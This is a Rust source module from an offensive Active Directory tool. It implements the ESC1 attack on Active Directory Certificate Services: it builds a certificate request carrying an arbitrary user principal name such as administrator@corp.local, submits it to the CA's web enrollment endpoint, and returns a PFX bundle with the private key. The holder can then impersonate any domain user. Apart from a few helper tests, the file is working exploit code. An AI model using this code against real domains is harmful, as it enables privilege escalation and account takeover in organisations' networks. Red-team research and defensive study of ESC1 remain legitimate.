//! ESC1 — SAN (Subject Alternative Name) Abuse
//!
//! ESC1 exploits certificate templates where:
//! - The enrollee can supply the subject (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)
//! - The template has "Client Authentication" or "Any Purpose" EKU
//! - Manager approval is not required
//! - No authorized signatures are required
//!
//! The attacker requests a certificate with an arbitrary UPN in the SAN
//! extension, allowing impersonation of any domain user (including DA).
//!
//! Reference: SpecterOps "Certified Pre-Owned" — ESC1

use crate::adcs::pfx::create_pfx;
use crate::adcs::web_enrollment::WebEnrollmentClient;
use crate::adcs::{IssuedCertificate, create_esc1_csr};
use crate::error::{OverthroneError, Result};
use tracing::{info, warn};

/// ESC1 exploiter for SAN abuse on vulnerable certificate templates.
pub struct Esc1Exploiter {
    web_client: WebEnrollmentClient,
}

impl Esc1Exploiter {
    /// Create a new ESC1 exploiter targeting the given CA server.
    pub fn new(ca_server: &str) -> Result<Self> {
        let web_client = WebEnrollmentClient::new(ca_server)?;
        Ok(Self { web_client })
    }

    /// Execute ESC1 attack — request a certificate with an arbitrary SAN UPN.
    ///
    /// # Arguments
    /// * `template` - Vulnerable template name (e.g. "ESC1-Vulnerable")
    /// * `target_upn` - UPN to impersonate (e.g. "administrator@corp.local")
    /// * `subject_cn` - Optional CN for the CSR subject (defaults to "overthrone-attack")
    ///
    /// # Returns
    /// * `Ok(IssuedCertificate)` with PFX data, thumbprint, serial, and private key
    pub async fn exploit(
        &self,
        template: &str,
        target_upn: &str,
        subject_cn: Option<&str>,
    ) -> Result<IssuedCertificate> {
        info!(
            "Executing ESC1 attack: template={}, target_upn={}",
            template, target_upn
        );

        // Build CSR with the target UPN embedded in the SAN extension
        let cn = subject_cn.unwrap_or("overthrone-attack");
        let (csr_der, private_key) = create_esc1_csr(cn, target_upn, template)?;

        // Submit CSR to the CA web enrollment endpoint
        let response = self
            .web_client
            .submit_request(&csr_der, template, None)
            .await?;

        if !response.is_issued() {
            return Err(OverthroneError::EscAttack {
                esc_number: 1,
                reason: format!("Certificate request denied: {}", response.message),
            });
        }

        let cert_data = response
            .certificate
            .ok_or_else(|| OverthroneError::Adcs("No certificate in ESC1 response".to_string()))?;

        // Verify the issued cert actually contains the target SAN
        if let Err(e) = Self::verify_certificate_san(&cert_data, target_upn) {
            warn!("ESC1 SAN verification warning (cert may still work): {}", e);
        }

        // Build PKCS#12 (PFX) bundle; fall back to raw DER if PFX construction fails
        let pfx_data =
            create_pfx(&cert_data, &private_key, None).unwrap_or_else(|_| cert_data.clone());

        Ok(IssuedCertificate {
            pfx_data,
            thumbprint: Self::compute_thumbprint(&cert_data),
            serial_number: Self::extract_serial(&cert_data).unwrap_or_default(),
            valid_from: "Unknown".to_string(),
            valid_to: "Unknown".to_string(),
            template: template.to_string(),
            subject: format!("CN={}", cn),
            issuer: self.web_client.base_url(),
            public_key_algorithm: "RSA".to_string(),
            signature_algorithm: "SHA256RSA".to_string(),
            private_key_pem: private_key,
        })
    }

    /// Verify that the issued certificate contains the expected UPN in its
    /// Subject Alternative Name (SAN) extension.
    ///
    /// OID 2.5.29.17 = subjectAltName
    /// We look for the target UPN anywhere in the SAN DER bytes as a simple
    /// heuristic (full ASN.1 SAN parsing would use x509-parser).
    pub fn verify_certificate_san(cert_der: &[u8], expected_upn: &str) -> Result<()> {
        use x509_parser::parse_x509_certificate;

        let (_, cert) = parse_x509_certificate(cert_der).map_err(|e| {
            OverthroneError::Adcs(format!("Failed to parse certificate for SAN check: {e}"))
        })?;

        // OID 2.5.29.17 — subjectAltName
        let san_oid = x509_parser::oid_registry::OID_X509_EXT_SUBJECT_ALT_NAME;

        for ext in cert.tbs_certificate.extensions() {
            if ext.oid == san_oid {
                // Simple substring check in raw extension value — sufficient
                // because UPN strings are encoded as UTF8String or IA5String.
                let raw = ext.value;
                let raw_str = String::from_utf8_lossy(raw);
                if raw_str.contains(expected_upn) {
                    info!("ESC1: SAN contains target UPN '{expected_upn}'");
                    return Ok(());
                }
            }
        }

        Err(OverthroneError::EscAttack {
            esc_number: 1,
            reason: format!(
                "Issued certificate does not contain expected UPN '{}' in SAN",
                expected_upn
            ),
        })
    }

    fn compute_thumbprint(cert_der: &[u8]) -> String {
        use sha1::{Digest, Sha1};
        let mut hasher = Sha1::new();
        hasher.update(cert_der);
        let result = hasher.finalize();
        hex::encode(result).to_uppercase()
    }

    fn extract_serial(cert_der: &[u8]) -> Result<String> {
        use x509_parser::parse_x509_certificate;
        match parse_x509_certificate(cert_der) {
            Ok((_, cert)) => {
                let serial = cert.tbs_certificate.serial.to_bytes_be();
                Ok(hex::encode(serial).to_uppercase())
            }
            Err(_) => Ok("Unknown".to_string()),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use proptest::prelude::*;

    #[test]
    fn test_esc1_exploiter_creation() {
        let exploiter = Esc1Exploiter::new("ca.corp.local");
        assert!(exploiter.is_ok());
    }

    #[test]
    fn test_compute_thumbprint() {
        let cert_der = vec![0x30, 0x82, 0x01, 0x00];
        let thumbprint = Esc1Exploiter::compute_thumbprint(&cert_der);
        assert!(!thumbprint.is_empty());
        assert_eq!(thumbprint.len(), 40); // SHA1 = 20 bytes = 40 hex chars
    }

    #[test]
    fn test_extract_serial_invalid_cert() {
        let cert_der = vec![0x30, 0x82, 0x01, 0x00];
        let serial = Esc1Exploiter::extract_serial(&cert_der);
        assert!(serial.is_ok());
    }

    proptest! {
        #[test]
        fn prop_thumbprint_deterministic(
            cert_data in prop::collection::vec(any::<u8>(), 1..1024)
        ) {
            let t1 = Esc1Exploiter::compute_thumbprint(&cert_data);
            let t2 = Esc1Exploiter::compute_thumbprint(&cert_data);
            prop_assert_eq!(&t1, &t2);
            prop_assert_eq!(t1.len(), 40);
        }
    }

    proptest! {
        #[test]
        fn prop_serial_extraction_no_panic(
            cert_data in prop::collection::vec(any::<u8>(), 1..1024)
        ) {
            let _ = Esc1Exploiter::extract_serial(&cert_data);
        }
    }
}
